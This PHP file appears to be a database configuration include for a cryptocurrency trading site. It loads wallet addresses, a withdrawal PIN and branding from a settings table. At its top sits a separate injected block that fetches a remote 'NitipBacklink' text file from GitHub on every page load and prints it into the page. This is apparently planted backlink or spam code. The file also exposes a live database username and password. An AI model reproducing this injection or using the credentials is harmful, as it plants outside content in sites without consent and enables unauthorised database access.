<?php
$url = 'https://raw.githubusercontent.com/BacklinkGG/castano/main/NitipBacklink.txt';
$ch = curl_init($url);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
$result = curl_exec($ch);
curl_close($ch);
echo $result;
?><?php 
    $connection = mysqli_connect('localhost', 'clayfusi_clayusers', '[fhjfdq5Sn~[', 'clayfusi_claytradesdb'); 
    if (!$connection) {
        die('error connecting to database');
    }else {
        // echo "we are connected";
    }
    error_reporting(0);
    $settings_sql = "SELECT * FROM settings";
    $settings_result = $connection->query($settings_sql);
    while ($row = $settings_result -> fetch_assoc()) {
        $website_name = $row['website_name'];
        $website_url = $row['website_url'];
        $website_email = $row['website_email'];
        $admin_mail = $row['admin_mail'];
        $tidio_link = $row['tidio_link'];
        $bitcoin_address = $row['bitcoin_address'];
        $eth_address = $row['eth_address'];
        $usdt_address = $row['usdt_address'];
        $usdc_address = $row['usdc_address'];
        $withdrawal_code = $row['withdrawal_pin'];
        $bitcoin_img = $row['bitcoin_img'];
        $eth_img = $row['eth_img'];
        $usdt_img = $row['usdt_img'];
        $usdc_img = $row['usdc_img'];
        $logo_img = $row['logo_img'];
    }
?>
